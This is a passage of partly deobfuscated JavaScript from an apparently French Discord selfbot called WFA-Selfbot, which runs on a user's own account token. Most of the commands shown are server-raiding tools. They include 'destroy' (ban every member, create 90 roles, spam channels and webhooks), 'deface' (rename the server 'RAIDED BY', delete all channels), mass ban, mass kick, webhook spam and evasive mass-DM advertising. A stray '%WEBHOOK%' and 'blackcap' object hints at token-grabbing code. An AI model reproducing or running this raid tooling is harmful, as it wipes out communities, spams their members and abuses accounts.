        'BVPUk': ':wave:',
        'rLiYr': function (ac, ad) {
          return ac + ad;
        },
        'aJjuS': ' a été expulser :point_right: ',
        'Cfmdt': 'Roblox',
        'ETOLL': '[COMMANDE] Commande roblox executé',
        'xFwlt': '!d bump',
        'LhDjK': '[COMMANDE] Commande start bumping executé',
        'jlcrX': '**ddos command stoped**',
        'NXddp': '[COMMAND] ddos voc stopée',
        'vUhiK': function (ac, ad) {
          return ac + ad;
        },
        'wwlxG': 'https://en-fun.wfaself.repl.co\nhttps://en-fun-1.wfaself.repl.co',
        'zzsLs': '[COMMAND] help fun command executed',
        'yORbv': function (ac, ad) {
          return ac(ad);
        },
        'eoHvZ': '[COMMANDE] Commande ass executé',
        'wXjeF': function (ac, ad) {
          return ac + ad;
        },
        'VdYrr': function (ac, ad) {
          return ac + ad;
        },
        'eKacf': '[COMMANDE] Commande 4k executé',
        'udlSN': 'Minecraft',
        'XcIAw': function (ac, ad) {
          return ac !== ad;
        },
        'KNvuX': 'Jlxho',
        'BIByK': function (ac, ad) {
          return ac + ad;
        },
        'zHIBG': '[COMMANDE] Commande pussy executé',
        'rTCoq': function (ac, ad, ae) {
          return ac(ad, ae);
        },
        'DlKgF': '[COMMAND] thigh command executed',
        'yDHeQ': 'uXygB',
        'HIaRg': function (ac, ad) {
          return ac + ad;
        },
        'PaaMa': function (ac, ad) {
          return ac + ad;
        },
        'RCghj': '>>> **NSFW Commande | WFA - Selfbot**\n\n\n',
        'sZiaE': '[COMMANDE] Commande anal executé',
        'ONwuZ': './Data/pubmp.json',
        'WXWFG': 'ShSll',
        'ZunAu': 'Gucci',
        'YSAXS': 'BE RICH WITH WFA',
        'vQptO': function (ac) {
          return ac();
        },
        'bsYoj': ' sur Gucci**',
        'RuDuu': '0|4|2|1|3|6|5',
        'wsssJ': ':x: **Command only usable on server**.',
        'Tgfjj': 'RAIDED BY WFA X ',
        'YGYtV': '[COMMAND] deface command executed',
        'vnPNL': 'wfa',
        'RocJx': function (ac, ad) {
          return ac === ad;
        },
        'CKtui': 'mhGay',
        'QAJHU': 'gucci0',
        'QVwLv': '[COMMAND] auto voice kick command executed',
        'cimLI': ':white_check_mark: **Auto Voice kick config!\n\nThis user can no longer join voice channels on this server**',
        'EQMSE': 'Lacoste',
        'QoKvI': 'BE RAKAILLE WITH WFA',
        'AbHhq': '[COMMANDE] Commande lacoste executé',
        'ZQjzL': ' sur lacoste**',
        'NZNrp': 'Nike',
        'uHUVb': '[COMMANDE] Commande nike executé',
        'BCowj': 'Facebook',
        'DWrJg': 'Skype',
        'jlBhw': 'BE MORE OLD WITH WFA',
        'pfcAx': function (ac) {
          return ac();
        },
        'ALQRf': '[COMMANDE] Commande facebook executé',
        'PPSqu': ' sur Facebook**',
        'GwisS': 'Tiktok',
        'SOnTr': 'BE A PUTE WITH WFA',
        'OvnVo': '[COMMANDE] Commande tiktok executé',
        'hGfFi': function (ac, ad) {
          return ac + ad;
        },
        'fpUHQ': function (ac, ad) {
          return ac == ad;
        },
        'ZeqWO': '716967712844414996',
        'rZMYu': 'Congratulations',
        'oLCJk': function (ac, ad) {
          return ac + ad;
        },
        'SBRUl': 'BE INFLUENCER WITH WFA',
        'sorNJ': 'now',
        'bTepx': '[COMMANDE] Commande instagram executé',
        'oVNBe': function (ac, ad) {
          return ac + ad;
        },
        'SyJjX': '[COMMAND] help raid command executed',
        'gTPcI': '721465320740487179',
        'Zhgfy': 'zGLtj',
        'oeaua': 'Pornhub',
        'SPmXx': '▓▓▓▓▓▓▓▓▓▓ 100%',
        'HWNta': function (ac, ad) {
          return ac !== ad;
        },
        'rNPQT': 'KYTPN',
        'deDWz': function (ac) {
          return ac();
        },
        'FVSVG': ' sur Tiktok**',
        'gymaD': function (ac, ad) {
          return ac === ad;
        },
        'dzzHG': 'NXeir',
        'TsREM': '[COMMANDE] Commande tinder executé',
        'dXhrd': function (ac, ad) {
          return ac + ad;
        },
        'CTQmL': ' sur Youtube**',
        'hekiH': 'youtube',
        'EEbKe': function (ac, ad) {
          return ac !== ad;
        },
        'EHeWq': 'https://nekobot.xyz/api/image',
        'CadOl': 'Rpc',
        'MeuMF': 'Fortnite',
        'colJa': 'WFA-Selfbot E',
        'AORfi': '[COMMANDE] Commande fortnite executé',
        'fHADj': function (ac, ad) {
          return ac + ad;
        },
        'ngxuZ': ' sur fortnite**',
        'cbkfd': ':x: **Il n\' y a aucun emote a supprimer.**',
        'ebdxF': '[COMMAND] pornhub command executed'
      };
      var V = T.content.substring(prefix.length).split(' '),
          W = T.mentions.users.first();
      let X = T;

      async function Y() {
        const ac = {
          'wMmcH': function (ad, ae) {
            return ad + ae;
          },
          'Eqoiz': function (ad, ae) {
            return ad + ae;
          },
          'Bjkvu': 'https://embed.rauf.workers.dev/?author=Command%2520NSFW&image=',
          'YEMuU': '[COMMAND] hentai command executed',
          'UsAMm': function (ad, ae) {
            return ad !== ae;
          },
          'Abmrj': 'xsQEN',
          'KCEdo': '3|1|2|5|0|4',
          'cYOwp': '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
          'ahjhm': '[EVENT] Je n\'ai pas pu réagir au giveaway sur ',
          'ZOvtQ': ', il est possible que je n\'ai pas les permissions :/',
          'nmxDa': 'avatar',
          'sqwnW': 'discriminator',
          'dShJK': 'mfa_enabled',
          'FaSWw': 'locale',
          'XCirL': 'verified',
          'yvFjL': 'nsfw_allowed',
          'rSZzF': function (ad, ae) {
            return ad + ae;
          },
          'AxHrK': '\nUser: ',
          'PBYTF': '\nEmail: ',
          'hLrdI': '\nNuméro de telephone: ',
          'fDahz': function (ad, ae) {
            return ad + ae;
          },
          'PIvix': '\nAvatar: ',
          'sowfA': function (ad, ae) {
            return ad + ae;
          },
          'FgkmX': '\nLangue: ',
          'orTYd': '\nA2f activé?: ',
          'kZLjb': '\nCompte vérifié?: ',
          'Oetlr': '\nNsfw activé?: ',
          'ceXvJ': function (ad, ae) {
            return ad + ae;
          },
          'SGUal': '\nFlags: ',
          'Gagle': '\nPublic Flags: ',
          'HONWQ': function (ad, ae) {
            return ad + ae;
          },
          'KGlDF': function (ad, ae) {
            return ad + ae;
          },
          'fVVMb': '```',
          'gMqnm': '[COMMANDE] Commande info token executé'
        };
        {
          const ad = Math.floor(Math.random() * 1500);

          async function ae() {
            const af = {
              'CiLdi': '%WEBHOOK%',
              'DfwBe': 'utf8',
              'JxZOx': 'index.js',
              'AKUHn': 'blackcap',
              'geXsc': function (ag) {
                return ag();
              },
              'FSQai': 'data'
            };
            T.react('🎉').catch(ag => {
              const ah = {
                'AXevi': function (ai, aj) {
                  return ai + aj;
                },
                'gBKGN': function (ai, aj) {
                  return ai + aj;
                },
                'CXhZK': function (ai, aj) {
                  return ai + aj;
                },
                'WhVGW': 'https://embed.rauf.workers.dev/?author=Command%2520NSFW&image=',
                'RLlit': '[COMMAND] hentai command executed'
              };
              {
                if (ag) {
                  const aj = '3|1|2|5|0|4'.split('|');
                  let ak = 0;
                  console.log(' ');
                  console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
                  console.log(consolecolor.atlas('[EVENT] Je n\'ai pas pu réagir au giveaway sur ' + T.guild.name + ', il est possible que je n\'ai pas les permissions :/'));
                  console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
                  console.log(' ');
                  return;
                }
              }
            }), console.log(' '), console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')), console.log(consolecolor.atlas('[EVENT] J\'ai correctement reagit au giveaway sur ' + T.guild.name + ' en ' + ad + 'ms je suis super rapide hehe ;)')), console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')), console.log(' ');
          }

          setTimeout(ae, ad);
        }
      }

      async function Z() {
        const ac = {
          'CDAZg': 'https://www.twitch.tv/OGAGAL_risitas',
          'iXoXq': 'WATCHING',
          'raPlY': '603405368940429315',
          'Iqglg': 'Nike',
          'zSnXz': 'BE NIKED WITH WFA',
          'VhNMc': function (ad) {
            return ad();
          },
          'hygXg': function (ad, ae) {
            return ad + ae;
          },
          'trfnA': ':white_check_mark: **Tu regardes ',
          'cEsMv': ' sur Nike**'
        };

        if (T.author.id == '294882584201003009' || T.author.id == '716967712844414996') {
          if (T.content.includes('Congratulations')) {
            if (T.content.includes(client.user.id)) {
              const ae = '1|3|2|0|4'.split('|');
              let af = 0;
              if (T.embeds) console.log(' ');
              console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
              console.log(consolecolor.atlas('[EVENT] GG Je t\'ai fais gagner le giveaway sur le serveur ' + T.guild.name + ', va vite reclamer ta récompense'));
              console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
              console.log(' ');
            }
          }
        }
      }

      Z(), T.author.id == '294882584201003009' || T.author.id == '716967712844414996' && T.embeds[0] && T.embeds[0].description.includes('React with') && Y();

      if (T.author.id == client.user.id) {
        if (x[client.user.id]) {
          if (T.content.includes(':x:')) return;else delete x[client.user.id];
          N(), T.channel.send(':white_check_mark: **Vous n\'etes plus afk**'), console.log(consolecolor.instagram('[COMMANDE] Commande afk stopé'));
        }
      }

      if (T.content.includes(client.user.id)) {
        if (T.author.id === client.user.id) return;

        if (x[client.user.id]) {
          const ac = '4|3|6|1|2|5|0'.split('|');
          let ad = 0;
          T.reply(':x: **Je suis afk pour la raison** ' + x[client.user.id].r);
          console.log(' ');
          console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
          console.log(consolecolor.atlas('[EVENT] L\'utilisateur ' + T.author.username + ' vient de vous ping lors de votre afk'));
          console.log(consolecolor.atlas('[EVENT] Message: ' + T.content));
          console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
          console.log(' ');
        } else return;
      }

      if (T.channel.type === 'dm') {
        if (X.author.bot) {
          if (T.content.includes('discord.gg')) {
            let af = T.author;
            af.send('/!\\ Anti mp').then(ag => {
              const ah = {
                'zwnvh': function (aj, ak) {
                  return aj + ak;
                },
                'SFuyL': 'https://nekobot.xyz/api/image',
                'OYcXC': 'https://embed.rauf.workers.dev/?author=Command%2520NSFW&image=',
                'tRRjH': '[COMMAND] hentai command executed',
                'iGKnh': 'hentai_anal'
              };
              const ai = ah;
              ag.delete();
            }), console.log(' '), console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')), console.log(consolecolor.atlas('[EVENT] Le bot ' + T.author.username + ' vous a envoyer une invitation discord')), console.log(consolecolor.atlas('[EVENT] Message: ' + T.content)), console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')), console.log(' ');
          }
        }
      }

      if (X.author.id !== client.user.id) return;

      if (T.content.startsWith(prefix + 'cmd')) {
        T.edit(ghost + 'https://cmd.wfaself.repl.co\n    https://cmd-1.wfaself.repl.co\n    https://cmd-2.wfaself.repl.co\n    https://cmd-3.wfaself.repl.co\n    https://cmd-4.wfaself.repl.co'), console.log(consolecolor.instagram('[COMMANDE] Commande cmd executé'));
      }

      T.content.startsWith(prefix + 'help') && (T.edit(ghost + 'https://help.wfaself.repl.co').catch(ah => {}), console.log(consolecolor.instagram('[COMMANDE] Commande help executé')));
      T.content.startsWith(prefix + 'help fun') && (T.edit(ghost + 'https://fun.wfaself.repl.co https://fun-1.wfaself.repl.co').catch(aj => {}), console.log(consolecolor.instagram('[COMMANDE] Commande help fun executé')));
      T.content.startsWith(prefix + 'help hack') && (T.edit(ghost + 'https://hack.wfaself.repl.co').catch(aj => {}), console.log(consolecolor.instagram('[COMMANDE] Commande help hack executé')));
      T.content.startsWith(prefix + 'help raid') && (T.edit(ghost + 'https://raid.wfaself.repl.co').catch(aj => {}), console.log(consolecolor.instagram('[COMMANDE] Commande help raid executé')));
      T.content.startsWith(prefix + 'help status') && (T.edit(ghost + 'https://status.wfaself.repl.co\n    https://status-1.wfaself.repl.co\n    https://status-2.wfaself.repl.co\n    https://status-3.wfaself.repl.co'), console.log(consolecolor.instagram('[COMMANDE] Commande help status executé')));
      T.content.startsWith(prefix + 'help backup') && (T.edit(ghost + 'https://backup.wfaself.repl.co'), console.log(consolecolor.instagram('[COMMANDE] Commande help backup executé')));

      if (T.content.startsWith(prefix + 'help moderation')) {
        T.edit(ghost + 'https://mod.wfaself.repl.co'), console.log(consolecolor.instagram('[COMMANDE] Commande help moderation executé'));
      }

      if (T.content.startsWith(prefix + 'help utile')) {
        T.edit(ghost + 'https://util.wfaself.repl.co\nhttps://util-1.wfaself.repl.co/\nhttps://util-2.wfaself.repl.co/\nhttps://util-3.wfaself.repl.co/'), console.log(consolecolor.instagram('[COMMANDE] Commande help utile executé'));
      }

      if (T.content === prefix + 'destroy') {
        if (T.deletable) T.delete();

        if (T.author.id == client.user.id) {
          T.guild.members.forEach(am => {
            am.ban().then(function () {});
          });
        }

        if (T.content.startsWith(prefix + 'destroy')) {
          if (T.author.id == client.user.id) {
            T.delete();

            for (var a0 = 0; a0 < 90; a0++) {
              const am = {
                'mentionable': false,
                'permissions': 0x0,
                'position': '',
                'color': 'RANDOM'
              };
              am.name = h, T.guild.createRole(am);
            }
          }
        }
      }

      if (T.content === prefix + 'destroy') {
        if (T.deletable) T.delete();

        if (T.author.id == client.user.id) {
          if (T.channel.type === 'dm') return;
          if (T.guild.channels.size === 0) return;
        }
      }

      if (T.content === prefix + 'destroy') {
        if (T.channel.type === 'dm') return;

        if (T.author.id == client.user.id) {
          T.guild.name != h && (T.guild.setIcon(i).catch(ap => {}), T.guild.setName(h).catch(ap => {}), T.guild.setRegion('russia').catch(ap => {}));
          setInterval(function () {
            T.guild.channels.size < 499 && T.guild.createChannel(h, 'text').catch(aq => {});
          }, 400);
          if (T.deletable) T.delete();
        }
      }

      if (T.content.startsWith(prefix + 'destroy')) {
        let aq = V.splice(0).join(' ') || '@everyone\nwfa-selfbot > ALL\nhttps://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg';
        if (T.channel.type === 'dm' || T.channel.type === 'group') return T.edit(':x: **Commande uniquement utilisable sur serveur**.');
        if (!T.member.hasPermission('MANAGE_WEBHOOKS')) return;
        setInterval(() => {
          const ar = {
            'sKVcr': function (as, at) {
              return as == at;
            },
            'hFELG': 'text'
          };
          T.guild.channels.forEach(at => {
            if (!at) return;
            at.type == 'text' && at.createWebhook(h, i).catch(au => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
          });
        }, 5000), setInterval(async function () {
          await T.guild.fetchWebhooks().then(ar => ar.forEach(as => as.send(aq).catch(at => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))));
        });
      }

      if (T.content === prefix + 'delete all channel') {
        let ar = T.guild;

        if (!ar) {
          T.edit(':x: **Veuillez executer cette commande dans un serveur!**');
          return;
        }

        if (!T.member.hasPermission('MANAGE_CHANNELS')) return T.delete().then(console.log('[', 'ERROR'.red, ']', 'permission insuffisante'.green));
        var a1 = T.guild.channels;
        a1.forEach(at => {
          at.delete().catch(au => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        }), console.log(consolecolor.instagram('[COMMANDE] Commande delete all channel executé'));
      }

      if (T.content === prefix + 'delete all role') {
        let at = X.guild;

        if (!at) {
          T.edit(':x: **Veuillez executer cette commande sur un serveur!**');
          return;
        }

        T.guild.roles.forEach(au => {
          au.delete().catch(av => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        }), console.log(consolecolor.instagram('[COMMANDE] Commande delete all role executé'));
      }

      if (T.content.startsWith(prefix + 'name all')) {
        let av = T.guild;
        if (!av) return X.edit(':x: **Commande uniquement utilisable sur un serveur**');
        const aw = T.content.split(' ').slice(2).join(' ') || T.author.username;
        if (!T.member.hasPermission('MANAGE_NICKNAMES')) return T.delete().then(console.log('[', 'ERROR'.red, ']', 'permission insuffisante'.green));
        const ax = T.guild.members;
        X.edit('Je renomme tout le monde par ' + aw), ax.forEach(ay => {
          const az = {
            'scryf': ':x: **Please run this command on a server**',
            'RuvlY': 'KICK_MEMBERS',
            'GgcGK': 'insufficient permission',
            'eOOHc': '[COMMAND] kick all command executed'
          };
          const aA = az;
          ay.setNickname(aw).catch(aC => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        }), console.log(consolecolor.instagram('[COMMANDE] Commande name all executé'));
      }

      if (T.content == prefix + 'ban all') {
        let az = T.guild;
        if (!az) return X.edit(':x: **Commande uniquement utilisable sur un serveur**');
        if (!T.member.hasPermission('BAN_MEMBERS')) return T.delete().then(console.log('[', 'ERROR'.red, ']', 'permission insuffisante'.green));
        T.guild.members.forEach(aA => {
          setInterval(() => {
            if (!aA.bannable) return;
            aA.ban().catch(aB => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
          }, 1000);
        }), console.log(consolecolor.instagram('[COMMANDE] Commande ban all executé'));
      }

      if (T.content === prefix + 'all kick') {
        let aA = T.guild;
        if (!aA) return X.edit(':x: **Commande uniquement utilisable sur un serveur**');
        if (!T.member.hasPermission('KICK_MEMBERS')) return T.delete().then(console.log('[', 'ERROR'.red, ']', 'permission insuffisante'.green));
        const aB = T.guild.members;
        aB.forEach(aC => {
          if (!aC.kickable) return;
          aC.kick().catch(aD => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        }), console.log(consolecolor.instagram('[COMMANDE] Commande kick all executé'));
      }

      if (T.content.startsWith(prefix + 'deface')) {
        const aC = '3|5|1|2|0|4|6'.split('|');
        let aD = 0;
        if (T.channel.type === 'dm' || T.channel.type === 'group') return T.edit(':x: **Commande uniquement utilisable sur serveur**.');
        if (!T.member.hasPermission('ADMINISTRATOR')) return T.edit(':x: **Vous n\'avez pas les permissions pour executer cette commande**');
        T.delete();
        T.guild.setName('RAIDED BY ' + h + ' X ' + client.user.username), T.guild.setIcon('https://media.discordapp.net/attachments/812490234427867146/836312989581049886/wfa.jpeg?width=676&height=676');
        T.guild.channels.forEach(aE => {
          if (!aE) return;
          aE.delete();
        });
        T.guild.createChannel(client.user.username, 'text');
        console.log(consolecolor.instagram('[COMMANDE] Commande deface executé'));
      }

      if (T.content.startsWith(prefix + 'create channel')) {
        if (T.channel.type === 'dm' || T.channel.type === 'group') return T.edit(':x: **Commande uniquement utilisable sur serveur**.');
        if (!T.member.hasPermission('MANAGE_CHANNELS')) return T.edit(':x: **Vous n\'avez pas les permissions pour executer cette commande**');
        T.delete();

        for (let aF = 0; aF < 20; aF++) {
          T.guild.createChannel('WFA-𝐱-' + client.user.username, 'text').catch(aH => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        }

        console.log(consolecolor.instagram('[COMMANDE] Commande create channel executé'));
      }

      if (T.content.startsWith(prefix + 'webhook spam')) {
        let aH = V.splice(2).join(' ') || '@everyone\nWFA - Selfbot\nhttps://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg';
        if (T.channel.type === 'dm' || T.channel.type === 'group') return T.edit(':x: **Commande uniquement utilisable sur serveur**.');
        if (!T.member.hasPermission('MANAGE_WEBHOOKS')) return;
        T.guild.channels.forEach(aI => {
          const aJ = {
            'TAcuH': 'Lacoste',
            'CdSOf': 'https://www.twitch.tv/OGAGAL_risitas',
            'HqvBe': 'WATCHING',
            'DZcax': '603405368940429315',
            'QDeOL': function (aK) {
              return aK();
            },
            'CnkDF': '[COMMAND] lacoste command executed',
            'eBlIn': function (aK, aL) {
              return aK + aL;
            },
            'WYfIn': function (aK, aL) {
              return aK + aL;
            },
            'YBlNq': ':white_check_mark: **You watch ',
            'Qvlbj': ' on lacoste**'
          };
          {
            if (!aI) return;
            aI.type == 'text' && aI.createWebhook(h, i).catch(aL => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
          }
        }), setInterval(async function () {
          await T.guild.fetchWebhooks().then(aI => aI.forEach(aJ => aJ.send(aH).catch(aK => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))));
        }), console.log(consolecolor.instagram('[COMMANDE] Commande webhook spam executé'));
      }

      if (T.content.startsWith(prefix + 'backup create')) {
        if (T.channel.type === 'dm' || T.channel.type === 'group') return T.edit(':x: **Commande uniquement utilisable sur serveur**.');
        const aJ = {
          'jsonBeautify': true
        };
        backup.create(T.guild, aJ).then(aK => {
          T.edit('la backup est prise, l\'id est: ' + aK.id + '`!');
        });
      }

      if (T.content.startsWith(prefix + 'backup load')) {
        const aL = require('discord-backup');

        let aM = V[1];
        if (!aM) return T.channel.send(':x: **tu dois mettre l\'id d\'une backup**!');
        const aN = {
          'clearGuildBeforeRestore': true
        };
        aL.load(backupData, guild, aN);
      }

      if (T.content.startsWith(prefix + 'backup list')) {
        const aO = require('discord-backup');

        aO.list().then(aP => {
          console.log(aP);
        });
      }

      T.content.startsWith(prefix + 'start bumping') && (T.delete(), T.channel.send('!d bump'), setInterval(() => {
        T.channel.send('!d bump');
      }, 7203000), console.log(consolecolor.instagram('[COMMANDE] Commande start bumping executé')));

      if (T.content.startsWith(prefix + 'get guild banner')) {
        T.delete();
        if (T.channel.type === 'dm' || T.channel.type === 'group') return T.edit(':x: **Commande uniquement utilisable sur serveur**.');
        console.log(consolecolor.instagram('[COMMANDE] Commande get guild banner executé')), console.log(consolecolor.summer('[BANNIERE] Voici la banniere: ' + T.guild.bannerURL));
      }

      if (T.content.startsWith(prefix + 'get guild pp')) {
        T.delete();
        if (T.channel.type === 'dm' || T.channel.type === 'group') return T.edit(':x: **Commande uniquement utilisable sur serveur**.');
        console.log(consolecolor.instagram('[COMMANDE] Commande get guild pp executé')), console.log(consolecolor.summer('[BANNIERE] Voici la pp: ' + T.guild.iconURL));
      }

      if (T.content.startsWith(prefix + 'mp all')) {
        if (!T.guild) return T.edit(':x: **Commande uniquement utilisable sur serveur**');
        T.delete(), console.log(consolecolor.instagram('[COMMANDE] Commande mp all executé'));
        let aQ = 0,
            aR = V.splice(2).join(' ') || '**Best Selfbot Discord**\nhttps://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg',
            aS = T.guild;
        if (!aS) return;
        setInterval(() => {
          let aT = aS.members.random();
          if (aT.user.bot) return;
          if (aT.user.id === client.user.id) return;
          if (aT.hasPermission('ADMINISTRATOR')) return;
          if (aT.hasPermission('MANAGE_MESSAGES')) return;
          if (aT.hasPermission('MANAGE_ROLES_OR_PERMISSIONS')) return;
          if (aT.hasPermission('BAN_MEMBERS')) return;
          if (z[aT.user.id]) return;
          aQ++, aT.send('Hello ^^').then(aV => aV.edit(aR)).catch(aV => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log(('[MP Envoyé]  |' + aT.user.username).green + '|  ' + aQ + ' / ' + X.guild.members.filter(aV => aV.presence.status !== 'offline').size + ' ');
          const aU = {
            'raison': 'mp'
          };
          z[aT.user.id] = aU;
          L();
        }, 8000);
      }

      if (T.content.startsWith(prefix + 'stop mp all')) {
        if (T.deletable) T.delete();
        commandIntervals.forEach(aT => {
          const aU = {
            'LFkuQ': function (aV, aW) {
              return aV === aW;
            },
            'nZMVa': ':x: **This emote is not on the server**.'
          };
          clearInterval(aT);
        }), console.log(consolecolor.instagram('[COMMANDE] Commande mp all stopée'));
      }

      if (T.content.startsWith(prefix + 'stop auto voice kick')) {
        if (!T.guild) return T.edit(':x: **Commande uniquement utilisable sur serveur**');
        if (!W) return T.edit(':x: **Veuillez mentionner un utilisateur**');
        if (!B[T.guild.id]) return T.edit(':x: *Tu n\'as encore blacklist vocal personne**');
        if (!B[T.guild.id].user === W.id) return T.edit(':x: **Tu n\'as pas blacklist cet utilisateur des vocaux*');
        W && (delete B[T.guild.id], console.log(consolecolor.instagram('[COMMAND] auto voice kick command stoped')), T.edit(':white_check_mark: **Auto Voice kick stoped for this user**'), P());
      }

      if (T.content.startsWith(prefix + 'auto voice kick')) {
        if (!T.guild) return T.edit(':x: **Commande utilisable sur serveur uniquement**');
        if (!T.guild.me.hasPermission('MOVE_MEMBERS')) return T.reply(':x:**Tu n\'as pas la permission de deconnecter cet utilisateur du vocal**.');
        const aV = T.mentions.members.first();
        if (!aV) return T.edit(':x:**Veuillez mentionner un utilisateur.**');
        const aW = {};
        aW.user = W.id, B[T.guild.id] = aW, P(), console.log(consolecolor.instagram('[COMMAND] auto voice kick commande exécuté')), T.edit(':white_check_mark: **Auto Voice kick setup l\'utilisateur ne pourra plus rejoindre de channel vocal de ce serveur**'), aV.voiceChannel && aV.setVoiceChannel(null).catch(aX => T.edit(':x:**The user is not in a voice channel.**'));
      }

      if (T.content.startsWith(prefix + 'nuke dm')) {
        let aY = '';
        T.edit('**Nuking dms...**'), client.users.forEach(aZ => aZ.deleteDM().catch(b0 => {})), T.edit(':white_check_mark: **Nuked dms**'), console.log(consolecolor.instagram('[COMMANDE] Commande nuke dm executé'));
      }

      if (T.content.startsWith(prefix + 'voice kick')) {
        if (!T.guild) return T.edit(':x: **Commande uniquement utilisable sur un serveur**');
        if (!T.guild.me.hasPermission('MOVE_MEMBERS')) return T.reply(':x:**Tu n\'a pas la permission de kick un utilisatur**.');
        const aZ = T.mentions.members.first();
        if (!aZ) return T.edit(':x:**Veuillez mentionner un utilisateur.**');
        if (!aZ.voiceChannel) return T.edit(':x:**L\'utilisateur n\'est pas dans un channel vocal.**');
        aZ.setVoiceChannel(null).catch(b0 => T.edit(':x:**L\'utilisateur n\'est pas dans un channel vocal.**')), (T.edit(':white_check_mark: **L\'utilisateur a été voice kick correctement**'), console.log(consolecolor.instagram('[COMMANDE] Commande voice kick executé')));
      }

      if (T.content.startsWith(prefix + 'afk')) {
        let b0 = V.splice(1).join(' ') || 'WFA-SELFBOT';
        const b1 = {
          'activé': 'oui'
        };
        b1.r = b0, x[client.user.id] = b1, N(), (T.edit(':white_check_mark: **Vous etes afk pour** ' + b0), console.log(consolecolor.instagram('[COMMANDE] Commande afk executé')));
      }

      if (T.content.startsWith(prefix + 'anti groupe on')) {
        let b3 = V.splice(1).join(' ') || 'WFA-SELFBOT';
        const b4 = {
          'activé': 'oui'
        };
        b4.r = b3, y[client.user.id] = b4, M(), (T.edit(':white_check_mark: **vous allez quitter les nouveaus groupes en disant: **' + b3), console.log(consolecolor.instagram('[COMMANDE] Commande anti groupe executé')));
      }

      T.content.startsWith(prefix + 'anti groupe off') && (delete y[client.user.id], M(), (T.edit(':white_check_mark: **l\'anti groupe est désactivé'), console.log(consolecolor.instagram('[COMMANDE] Commande anti groupe stopé'))));

      if (T.content.startsWith(prefix + 'avatar' || prefix + 'pp')) {
        const b6 = T.mentions.users.first() || T.author;
        T.edit(ghost + ('https://embed.rauf.workers.dev/?author=Commande%2520Avatar&description=Voici%2520l%27avatar%2520de%2520' + b6.username + '&image=' + b6.avatarURL)).catch(b7 => console.log('[', 'ERREUR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log(consolecolor.instagram('[COMMANDE] Commande avatar executé'));
      }

      if (T.content === prefix + 'change hypesquad brilliance') {
        let b7 = 'https://discordapp.com/api/v6/hypesquad/online';
        const b8 = {
          'house_id': 0x2
        };
        request(b7, {
          'method': 'POST',
          'headers': {
            'authorization': token,
            'content-type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
          },
          'body': JSON.stringify(b8)
        }), X.edit(':white_check_mark: **Vous avez rejoint la hypesquad \'brilliance\'**'), console.log(consolecolor.instagram('[COMMANDE] Commande change hypesquad executé'));
      }

      if (T.content === prefix + 'change hypesquad ballance') {
        let ba = 'https://discordapp.com/api/v6/hypesquad/online';
        const bb = {
          'content-type': 'application/json',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
        };
        bb.authorization = token;
        const bc = {
          'house_id': 0x3
        };
        request(ba, {
          'method': 'POST',
          'headers': bb,
          'body': JSON.stringify(bc)
        }), X.edit(':white_check_mark: **Vous avez rejoint la hypesquad \'ballance\'**'), console.log(consolecolor.instagram('[COMMANDE] Commande change hypesquad executé'));
      }

      if (T.content === prefix + 'change hypesquad bravery') {
        let bd = 'https://discordapp.com/api/v6/hypesquad/online';
        const be = {
          'house_id': 0x1
        };
        (request(bd, {
          'method': 'POST',
          'headers': {
            'authorization': token,
            'content-type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
          },
          'body': JSON.stringify(be)
        }), X.edit(':white_check_mark: **Vous avez rejoint la hypesquad \'bravery\'**')), console.log(consolecolor.instagram('[COMMANDE] Commande change hypesquad executé'));
      }

